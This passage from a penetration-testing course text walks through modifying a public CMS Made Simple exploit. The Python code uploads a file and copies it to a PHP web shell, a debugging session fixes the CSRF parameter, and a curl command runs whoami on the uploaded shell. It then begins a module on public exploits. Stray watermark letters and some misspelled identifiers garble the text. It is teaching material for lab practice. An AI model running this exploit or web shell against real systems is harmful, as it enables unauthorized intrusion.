php_filename = 'shell.php'
payload = ""
def parse_csrf_token(location):
return location.split(csrf_param + "=")[1]
def authenticate():
page = "/login.php"
url = base_url + page
data = {
"username": username,
"password": password,
"loginsubmit": "Submit"
}
response = requests.post(url, data=data, allow_redirects=False, verify=False)
status_code = response.status_code
if status_code == 302:
print "[+] Authenticated successfully with the supplied credentials"
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 447
Made in Morocco
Penetration Testing with Kali Linux
return response.cookies, parse_csrf_token(response.headers['Location'])
print "[-] Authentication failed"
return None, None
def upload_txt(cookies, csrf_token):
mact = "FileManager,m1_,upload,0"
page = "/moduleinterface.php"
url = base_url + page
data = {
"mact": mact,
csrf_param: csrf_token,
"disable_buffer": 1
}
txt = {
'm1_files[]': (txt_filename, payload)
} y
print "[*] Attempting to upload {}...".format(txt_filename)
response = requests.post(url, data=data, files=txt, cookies=cookies, verify=False)
status_code = response.status_code k
if status_code == 200:
print "[+] Successfully uploaded {}".format(txt_filename)
s
return True
print "[-] An error occurred while uploading {}".format(txt_filename)
return None o
def copy_to_php(cookies, csrf_token):
mact = "FileManager,m1_,fileaction,n0"
page = "/moduleinterface.php"
url = base_url + page
b64 = base64.b64encode(txt_fiilename)
serialized = 'a:1:{{i:0;s:z{}:"{}";}}'.format(len(b64), b64)
data = {
"mact": mact,
D
csrf_param: csrf_token,
"m1_fileactioncopy": "",
"m1_path": upload_dir,
"m1_selall": serialized,
"m1_destdir": "/",
"m1_destname": php_filename,
"m1_submit": "Copy"
}
print "[*] Attempting to copy {} to {}...".format(txt_filename, php_filename)
response = requests.post(url, data=data, cookies=cookies, allow_redirects=False,
verify=False)
status_code = response.status_code
if status_code == 302:
if response.headers['Location'].endswith('copysuccess'):
print "[+] File copied successfully"
return True
print "[-] An error occurred while copying, maybe {} already
exists".format(php_filename)
return None
def quit():
print "[-] Exploit failed"
exit()
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 448
Made in Morocco
Penetration Testing with Kali Linux
def run():
cookies,csrf_token = authenticate()
if not cookies:
quit()
if not upload_txt(cookies, csrf_token):
quit()
if not copy_to_php(cookies, csrf_token):
quit()
print "[+] Exploit succeeded, shell can be found at: {}".format(upload_url + '/' +
php_filename)
run()
Listing 340 - Modified exploit containing the required changes for our case
Running the exploit generates an unexpected error.
y
kali@kali:~$ python2 44976_modified.py
/usr/lib/python2.7/dist-packages/urllib3/connectionpool.kpy:849:
InsecureRequestWarning: Unverified HTTPS request is being made. Adding certificate
verification is strongly advised. See:
s
https://urllib3.readthedocs.io/en/latest/advanced-usage.html#ssl-warnings
InsecureRequestWarning)
[+] Authenticated successfully with the supploied credentials
Traceback (most recent call last):
File "44976_modified.py", line 103, in 
run() n
File "44976_modified.py", line 94, in run
cookies,csrf_token = authenticate()
File "44976_modified.py", linei 38, in authenticate
return response.cookies, pzarse_csrf_token(response.headers['Location'])
File "44976_modified.py", line 24, in parse_csrf_token
return location.split(csrf_param + "=")[1]
IndexError: list index ouDt of range
Listing 341 - Python error presented when running the modified version of the exploit
An exception was triggered during the execution of the parse_csrf_token function on line 24 of the
code. The error indicates that the code tried to access a non-existent element of a Python list via
its second element (location.split(csrf_param + “=”)[1]).
We’ll discuss how to circumvent this issue in the next section.
14.2.3 Troubleshooting the “index out of range” Error
As we found during the previous section, the Python interpreter has thrown an error related to line
24 of our modified exploit.
Inspecting this line, we’ll notice that it uses the split704 method in order to slice the string stored in
the location parameter passed to the parse_csrf_token function. The Python documentation for
split705 indicates that this method slices the input string using an optional separator passed as a
704 (W3Schools, 2022), https://www.w3schools.com/python/ref_string_split.asp
705 (Python, 2022), https://docs.python.org/3/library/stdtypes.html
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 449
Made in Morocco
Penetration Testing with Kali Linux
first argument. The string slices returned by split are then stored in a Python list object that can
be accessed via an index.
kali@kali:~$ python
...
>>> mystr = "Kali*-*Linux*-*Rocks"
>>> result = mystr.split("*-*")
>>> result
['Kali', 'Linux', 'Rocks']
>>> result[1]
'Linux'
Listing 342 - Python string split method
y
In our exploit code, the string separator is defined as the csrf_param variable (“__c”) followed by
the equals sign.
k
csrf_param = "__c"
txt_filename = 'cmsmsrce.txt' s
php_filename = 'shell.php'
payload = ""
o
def parse_csrf_token(location):
return location.split(csrf_param + "=")[1]
n
Listing 343 - Understanding the code on line 24
In order to better understand the IndexError, we can add a print statement in the parse_csrf_token
i
function before the return instruction:
z
csrf_param = "__c"
txt_filename = 'cmsmsrce.txt'
D
php_filename = 'shell.php'
payload = ""
def parse_csrf_token(location):
print "[+] String that is being split: " + location
return location.split(csrf_param + "=")[1]
Listing 344 - Adding a print statement to see the string where the split method is invoked on
The exploit now displays the full string before the split method is invoked.
kali@kali:~$ python2 44976_modified.py
/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py:849:
InsecureRequestWarning: Unverified HTTPS request is being made. Adding certificate
verification is strongly advised. See:
https://urllib3.readthedocs.io/en/latest/advanced-usage.html#ssl-warnings
InsecureRequestWarning)
[+] Authenticated successfully with the supplied credentials
[+] String that is being split:
https://10.11.0.128/admin?_sk_=f2946ad9afceb247864
Traceback (most recent call last):
File "44976_modified.py", line 104, in 
run()
File "44976_modified.py", line 95, in run
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 450
Made in Morocco
Penetration Testing with Kali Linux
cookies,csrf_token = authenticate()
File "44976_modified.py", line 39, in authenticate
return response.cookies, parse_csrf_token(response.headers['Location'])
File "44976_modified.py", line 25, in parse_csrf_token
return location.split(csrf_param + "=")[1]
IndexError: list index out of range
Listing 345 - Inspecting the print output and noticing the absence of the string defined in the csrf_param variable
While the exploit code expected the input string to contain “__c” (defined in the csrf_param
variable) as shown in Listing 344, we received “_sk_” from the web application.
At this point, we do not fully understand why this is happening. Perhaps there is a version
mismatch between the exploit developer’s software and ours, or a CMS configuration mismatch.
In any case, we know that exploit development is never straightforward.
Next, let’s try to change the csrf_param variable to match the CMSy response and find out if the
exploit works.
k
csrf_param = "_sk_"
txt_filename = 'cmsmsrce.txt'
php_filename = 'shell.php' s
payload = ""
Listing 346 - Changing the csrf_param variable
o
Now, we’ll execute the modified exploit:
n
kali@kali:~$ python2 44976_modified.py
/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py:849:
InsecureRequestWarning: Unverified HTTPS request is being made. Adding certificate
i
verification is strongly advised. See:
https://urllib3.readthedocs.ioz/en/latest/advanced-usage.html#ssl-warnings
InsecureRequestWarning)
[+] Authenticated successfully with the supplied credentials
D
[+] String that is being split: https://192.168.50.45/admin?_sk_=bdc51a781fe6edcc126
[*] Attempting to upload cmsmsrce.txt...
...
[+] Successfully uploaded cmsmsrce.txt
[*] Attempting to copy cmsmsrce.txt to shell.php...
...
[+] File copied successfully
[+] Exploit succeeded, shell can be found at: https://192.168.50.45/uploads/shell.php
Listing 347 - Successful exploitation output
The error is no longer displayed and we are presented with a message informing us that the
exploit has succeeded. Although we don’t clearly understand why we needed to change the
csrf_param variable, this scenario showed us how to adapt to unexpected situations, something
great penetration testers do very well.
We can now validate the exploit by attaching to the PHP shell with a tool like curl and supplying a
system command to serve as the payload:
kali@kali:~$ curl -k https://192.168.50.45/uploads/shell.php?cmd=whoami
www-data
Listing 348 - Verifying if our exploit was successful by trying to execute whoami using the uploaded php shell
Nice! The exploit was successful, and we now have a web shell.
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 451
Made in Morocco
Penetration Testing with Kali Linux
14.3 Wrapping Up
In this Module, we covered the main segments of a plain stack-based buffer overflow that
required extensive editing to match our target environment. We then cross-compiled the code in
order to make it run on our Kali attack platform.
We also modified a web exploit to demonstrate how these types of exploits can be re-purposed
for a different target environment.
These scenarios reveal solutions to common obstacles encountered when dealing with public
exploits during an engagement.
y
k
s
o
n
i
z
D
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 452
Made in Morocco
Penetration Testing with Kali Linux
15 Locating Public Exploits
In this Learning Module, we will cover the following Learning Units:
• Getting Started with Public Exploits
• Online Exploit Resources
• Offline Exploit Resources
• Exploiting a Target
An exploit706 is a program or script that can leverage a flaw or vulnerability of a target system.
Exploits can have a range of effects, such as a denial of service (DoS),707 remote code execution
(RCE),708 or a privilege escalation (privesc).709
y
A common process of a penetration testing engagement is the use of publicly available exploits,
and searching for appropriate exploits becomes a critical skill wkhen this need arises.
In this Module, we will focus on various online resources that host exploits for publicly known
s
vulnerabilities. We will also inspect offline tools available in Kali that contain locally-hosted
exploits.
o
With the knowledge to find public exploits, we will then narrow our search to relevant ones that
could be used to gain access to a machine. At the end of this Module, we will enumerate a target
n
to determine which exploit(s) can be used to compromise it.
15.1 Getting Started i
z
This Learning Unit covers the following Learning Objectives:
D
• Understand the risk of executing untrusted exploits
• Understand the importance of analyzing the exploit code before execution
In this Learning Unit, we will review a malicious public exploit. It is important to understand the
risks associated with executing unknown exploits, especially if we don’t analyze what the exploit
code does.
15.1.1 A Word of Caution
We must understand that by downloading and running public exploits, we can greatly endanger a
system or environment. With this in mind, we need to carefully read and understand the code
before execution to ensure no negative effects.
Let’s use 0pen0wn, which was published as a remote exploit for SSH, as an example. While
reading the source code, we noticed that it was asking for “root” privileges, which was suspicious.
706 (Trend Micro, 2022), https://www.trendmicro.com/vinfo/us/security/definition/exploit
707 (Wikipedia, 2023), https://en.wikipedia.org/wiki/Denial-of-service_attack
708 (Bugcrowd, 2022), https://www.bugcrowd.com/glossary/remote-code-execution-rce/
709 (Wikipedia, 2022), https://en.wikipedia.org/wiki/Privilege_escalation
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 453
Made in Morocco
Penetration Testing with Kali Linux
if (geteuid()) {
puts("Root is required for raw sockets, etc."); return 1;
}
Listing 349 - Malicious SSH exploit asking for root privileges on the attacking machine